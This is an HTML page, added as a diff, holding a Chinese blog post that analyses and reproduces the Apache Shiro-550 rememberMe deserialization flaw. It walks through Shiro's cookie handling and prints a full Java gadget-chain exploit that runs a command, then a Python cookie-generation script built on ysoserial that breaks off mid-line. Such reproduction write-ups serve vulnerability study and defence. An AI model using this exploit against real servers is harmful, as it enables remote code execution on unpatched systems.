@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Apache shiro是一个Java安全框架，执行身份验证、授权、密码和会话管理。2016年，曝光了其1.2.4版本以前存在反序列化漏洞。该漏洞被称为shiro-550。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shiro-550反序列化漏洞分析复现">
+<meta property="og:url" content="http://yoursite.com/2020/05/08/shrio-550-attack/index.html">
+<meta property="og:site_name" content="Ananaskr&#39;s Blog">
+<meta property="og:description" content="Apache shiro是一个Java安全框架，执行身份验证、授权、密码和会话管理。2016年，曝光了其1.2.4版本以前存在反序列化漏洞。该漏洞被称为shiro-550。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2020/05/08/shrio-550-attack/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/08/shrio-550-attack/2.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/08/shrio-550-attack/3.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/08/shrio-550-attack/4.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/08/shrio-550-attack/5.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/08/shrio-550-attack/6.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/08/shrio-550-attack/7.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/08/shrio-550-attack/8.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/08/shrio-550-attack/9.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/08/shrio-550-attack/10.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/08/shrio-550-attack/11.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/08/shrio-550-attack/12.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/08/shrio-550-attack/13.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/08/shrio-550-attack/14.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/08/shrio-550-attack/15.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/08/shrio-550-attack/16.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/08/shrio-550-attack/17.png">
+<meta property="article:published_time" content="2020-05-08T07:54:56.000Z">
+<meta property="article:modified_time" content="2020-05-08T07:56:16.857Z">
+<meta property="article:author" content="ananaskr">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/05/08/shrio-550-attack/1.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/05/08/shrio-550-attack/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>shiro-550反序列化漏洞分析复现 | Ananaskr's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ananaskr's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/About/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/08/shrio-550-attack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ananaskr">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ananaskr's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          shiro-550反序列化漏洞分析复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-05-08 15:54:56 / Modified: 15:56:16" itemprop="dateCreated datePublished" datetime="2020-05-08T15:54:56+08:00">2020-05-08</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Apache shiro是一个Java安全框架，执行身份验证、授权、密码和会话管理。2016年，曝光了其1.2.4版本以前存在反序列化漏洞。该漏洞被称为shiro-550。</p>
+<a id="more"></a>
+
+<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
+<li>&lt;= 1.2.4</li>
+</ul>
+<h2 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h2><p>RememberMe</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>shiro默认的设置暴露了web应用的反序列化攻击。特别是考虑到最近使用的<font color=#008000>commons-collections</font>的利用。  </p>
+<p>默认情况下，Apache Shiro框架使用<font color=#008000>CookieRememberMeManager</font>。它序列化、加密以及编码用户identity，以便之后的检索。因此，当它接收到来自未认证用户的请求时，它会寻找它们记住的identity，通过以下步骤:</p>
+<ul>
+<li>检索rememberMe cookie的值</li>
+<li>Base64解码</li>
+<li>使用AES解密</li>
+<li>反序列化(ObjectInputStream)</li>
+</ul>
+<p>然而，默认加密的key是硬编码的，意味着任何可以获得源代码的人都知道默认加密密钥的值。因此，攻击者可以创建一个恶意的对象，序列化(在调用序列化时未进行任何的过滤)、编码，然后将其作为cookie发送。Shiro将解码并反序列化它，意味着现在恶意的对象已经存活在服务器上了。</p>
+<h1 id="反序列化分析"><a href="#反序列化分析" class="headerlink" title="反序列化分析"></a>反序列化分析</h1><h2 id="cookie生成过程"><a href="#cookie生成过程" class="headerlink" title="cookie生成过程"></a>cookie生成过程</h2><p>对于利用方式的分析，首先跟进一下Cookie的生成存储过程。Shiro框架的特征是登录页面的cookie中存在rememberMe的内容值。在登录时勾选上remmemberMe框。</p>
+<p>首先在<code>org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin</code>处下断点。</p>
+<p><img src="1.png" alt=""></p>
+<p>首先会进入<code>forgetIndentity</code>，在这个函数里将在response添加一些cookie信息。接着，由于设置了<code>token.setRememberMe(true)</code>。将会进入<code>rememberIdentity(subject,token,info)</code>。</p>
+<p><img src="2.png" alt=""></p>
+<p>首先获得info的principals，然后进入<code>rememberIndentity(subject,principals)</code>。跟进它</p>
+<p><img src="3.png" alt=""></p>
+<p>首先调用convertPrincipalsToBytes, 跟进它。它首先会序列化principals，然后，会用CBC模式进行分组加密。</p>
+<p><img src="4.png" alt=""></p>
+<p>然后调用<code>rememberSerializedIdentity</code>函数。跟进这个函数，可以看到它首先将序列化加密后的principals进行base64加密，然后存入cookie中。整个过程和我们了解到的一样，先<font color=#008000>序列化</font>，然后进行<font color=#008000>AES加密</font>，最后进行<font color=#008000>Base64加密</font>。</p>
+<h2 id="cookie的反序列化过程"><a href="#cookie的反序列化过程" class="headerlink" title="cookie的反序列化过程"></a>cookie的反序列化过程</h2><p>首先来看看整个的调用链</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DefaultSecurityManager.createSubject()</span><br><span class="line">  -&gt;DefaultSecurityManager.resolvePrincipals()</span><br><span class="line">    -&gt;DefaultSecurityManager.getRememberedIdentity()</span><br><span class="line">      -&gt;AbstractRememberMeManager.getRememberedPrincipals()</span><br><span class="line">        -&gt;</span><br></pre></td></tr></table></figure>
+
+<p>前面了解到了cookie生成的整个过程，接下来看看它的反序列化过程。选择了在<code>org.apache.shiro.mgt.AbstractRememberMeManager#decrypt</code>这个位置下断点。其调用链如下所示</p>
+<p><img src="5.png" alt=""></p>
+<p>因为是从<code>SecurityManager</code>开始，然后开始进行相关的身份校验。往上走一步，定位到<code>getRememberedPrincipals</code>函数。</p>
+<p><img src="6.png" alt=""></p>
+<p>它首先会调用getRememberedSerializedIdentity函数，跟进它。</p>
+<p><img src="7.png" alt=""></p>
+<p>它会获取到http请求中的cookie值，然后将其进行base64解码并返回解码后的值。</p>
+<p>然后跟进<code>convertBytesToPrincipals</code>函数。</p>
+<p><img src="8.png" alt=""></p>
+<p>它会先将其进行解密然后进行反序列化。首先decrypt函数会讲其进行解密。然后调用<code>deserialize</code>函数来处理解密后的内容。</p>
+<p><img src="9.png" alt=""></p>
+<p>跟进它。</p>
+<p><img src="10.png" alt=""></p>
+<p>继续跟进<code>this.getSerializer().deserialize</code>函数</p>
+<p><img src="11.png" alt=""></p>
+<p>这里进入到了DefaultSerializer.deserialize函数，这个函数里看到了熟悉的readObject函数。</p>
+<p><img src="12.png" alt=""></p>
+<p>到这里整个反序列化过程的分析就结束了。接下来看看如何利用吧！</p>
+<h1 id="漏洞利用分析"><a href="#漏洞利用分析" class="headerlink" title="漏洞利用分析"></a>漏洞利用分析</h1><p>在大多数直接利用的版本中，发现shiro自带的commons-collections的版本是3.2.1，从前面针对commons-collections的<a href="https://ananaskr.github.io/2020/04/29/ysoserial-cc-sumary/" target="_blank" rel="noopener">总结</a>可以知道，CommonsCollections1，3，5，6，7，9，10都可以利用。  </p>
+<p>然而在实际利用时，会发现无法直接利用shiro自带的commons-collections:3.2.1。从@orange和@zsx文章中，可以得知。<font color=#008000>Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，ClassLoader.loadClass不支持装载数组类型的class</font>。</p>
+<p>让我们来分析分析这一过程。在前面分析到deserialize函数时，会发现</p>
+<p><img src="13.png" alt=""></p>
+<p>在第49行使用的是<code>ClassResolvingObjectInputStream</code>而不是传统的<code>ObjectInputStream</code>。跟进它，</p>
+<p><img src="14.png" alt=""></p>
+<p>可以看到它重写了ObjectInputStream的resolveClass函数。与下面这个传统的resolveClass相比，它使用的是<code>ClassUtils.forName()</code>。</p>
+<p><img src="15.png" alt=""></p>
+<p>跟进<code>ClassUtils.forName()</code>函数。</p>
+<p><img src="16.png" alt=""></p>
+<p>可以看到，它使用的是线程上下文加载器，它获取到的当前加载器是<code>ParallelWebappClassLoader</code>，其loadClass方法是继承自父类<code>WebappClassLoader</code>。会按照以下方式进行加载。</p>
+<p><img src="17.png" alt=""></p>
+<p>根据流程，<code>ParallelWebappClassLoader</code>会先寻找内部缓存，若找不到则交给URLClassLoader。在对于path为<code>/Lorg/apache/commons/collections/Transformer;.class</code>的情况下，是找不到的。所以，导致ClassNotFound。</p>
+<p>因此，在利用链中不能包含数组，即在之前分析的命令执行点，不能使用ChainedTransformer这个类。因为这个类的成员变量是一个数组。而之前分析的CommonsCollections利用链中，有提到利用InvokerTransformer的transform方法来调用newTransformer。之前的介绍中有利用LazyMap.get()来触发transform。<a href="https://www.anquanke.com/post/id/192619" target="_blank" rel="noopener">wh1t3p1g</a>也介绍了这种方式，结合了CommonsCollections5，6，9利用链，所以在这里就不再赘述了。直接来看看整个利用链</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HashSet.readObject()</span><br><span class="line">  -&gt;HashMap.put()</span><br><span class="line">    -&gt;HashMap.hash()</span><br><span class="line">      -&gt;TiedMapEntry.hashCode()</span><br><span class="line">        -&gt;TiedMapEntry.getValue()</span><br><span class="line">          -&gt;LazyMap.get()</span><br><span class="line">            -&gt;InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>
+
+<p>完整的demo如下:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">8207363842866235160L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line">        Object templates = Class.forName(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>).newInstance();</span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        Field field = templates.getClass().getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(templates,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes,classFiles.classAsBytes(Foo<span class="class">.<span class="keyword">class</span>)&#125;)</span>;</span><br><span class="line"></span><br><span class="line">        Field field2 = templates.getClass().getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        field2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field2.set(templates,<span class="string">"ananaskr"</span>);</span><br><span class="line"></span><br><span class="line">        Field field3 = templates.getClass().getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">        field3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field3.set(templates, TransformerFactoryImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>())</span>;</span><br><span class="line"></span><br><span class="line">        InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"toString"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>],<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Map innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazymap = LazyMap.decorate(innermap,transformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazymap,templates);</span><br><span class="line"></span><br><span class="line">        HashSet map = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">        map.add(<span class="string">"foo"</span>);</span><br><span class="line"></span><br><span class="line">        Field f = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField("map");</span><br><span class="line">        &#125;<span class="keyword">catch</span> (NoSuchFieldException e)&#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField("backingMap");</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap innimpl = (HashMap) f.get(map);</span><br><span class="line"></span><br><span class="line">        Field f2 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField("table");</span><br><span class="line">        &#125;<span class="keyword">catch</span> (NoSuchFieldException e)&#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField("elementData");</span><br><span class="line">        &#125;</span><br><span class="line">        f2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] array = <span class="keyword">new</span> Object[<span class="number">0</span>];</span><br><span class="line">        array = (Object[]) f2.get(innimpl);</span><br><span class="line">        Object node = array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field keyField = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            keyField = Class.forName(<span class="string">"java.util.MapEntry"</span>).getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        keyField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        keyField.set(node, entry);</span><br><span class="line">        </span><br><span class="line">        Field field0 = transformer.getClass().getDeclaredField(<span class="string">"iMethodName"</span>);</span><br><span class="line">        field0.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field0.set(transformer,<span class="string">"newTransformer"</span>);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        out.writeObject(map);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>将其产生的序列化后的数据，放入脚本中，生成cookie即可。脚本内容如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(command)</span>:</span></span><br><span class="line">	popen = subprocess.Popen([<span class="string">'java'</span>,<span class="string">'-jar'</span>,<span class="string">'ysoserial.jar'</span>,<span class="string">'CommonsCollections5'</span>,command],stdout=subprocess.PIPE)</span><br><span class="line">	BS = AES.block_size</span><br><span class="line">	pad = <span class="keyword">lambda</span> s: s +((BS - len(s) % BS) * chr(BS - len(s) % 